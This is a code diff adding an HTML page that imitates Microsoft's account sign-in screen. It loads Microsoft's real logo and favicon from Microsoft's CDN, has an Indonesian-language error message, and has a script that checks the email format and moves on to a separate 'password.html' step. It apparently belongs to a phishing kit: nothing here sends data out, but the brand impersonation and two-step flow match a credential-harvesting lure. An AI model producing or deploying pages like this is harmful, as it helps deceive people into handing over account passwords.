@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Account</title>
+    <link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" type="image/x-icon">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        function validateUsername() {
+            const username = document.getElementById('username-input').value;
+            const errorMessage = document.getElementById('error-message');
+            const usernamePattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/; // Email pattern
+
+            if (usernamePattern.test(username)) {
+                // Redirect to password.html if valid
+                window.location.href = 'password.html';
+            } else {
+                // Show error message if invalid
+                errorMessage.textContent = 'Username tidak valid. Harap masukkan email yang benar.';
+                errorMessage.classList.remove('hidden');
+            }
+        }
+    </script>
+</head>
+<body class="bg-gradient-to-r from-blue-100 to-green-100 h-screen flex items-center justify-center">
+    <div class="w-full max-w-sm mx-auto">
+        <div class="bg-white shadow-md rounded-lg p-8">
+            <div class="flex items-center mb-6">
+                <img alt="Microsoft logo" class="mr-2" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png"/>
+            </div>
+            <h2 class="text-2xl font-semibold mb-4">Sign in</h2>
+            <label for="username-input" class="text-gray-700 mb-2">Email, phone, or Skype</label>
+            <input id="username-input" class="w-full border-b border-gray-300 focus:outline-none focus:border-blue-500 mb-4 pb-1" type="email" required />
+            <p id="error-message" class="text-red-600 hidden mb-4"></p>
+            <div class="flex justify-between items-center mb-4">
+                <a class="text-blue-600" href="#">
+                    No account? <span class="underline">Create one!</span>
+                </a>
+            </div>
+            <a class="text-blue-600 mb-4 block" href="#">
+                Can't access your account?
+            </a>
+            <button onclick="validateUsername()" class="w-full bg-blue-600 text-white py-2 rounded-md">
+                Next
+            </button>
+        </div>
+        <div class="mt-4 flex justify-center">
+            <button class="flex items-center bg-white shadow-md rounded-md py-2 px-4">
+                <i class="fas fa-key mr-2"></i>
+                <span>Sign-in options</span>
+            </button>
+        </div>
+    </div>
+    <div class="absolute bottom-0 right-0 mb-4 mr-4 flex space-x-4 text-gray-600 text-sm">
+        <a class="hover:underline" href="#">Terms of use</a>
+        <a class="hover:underline" href="#">Privacy &amp; cookies</a>
+        <span>...</span>
+    </div>
+</body>
+</html>
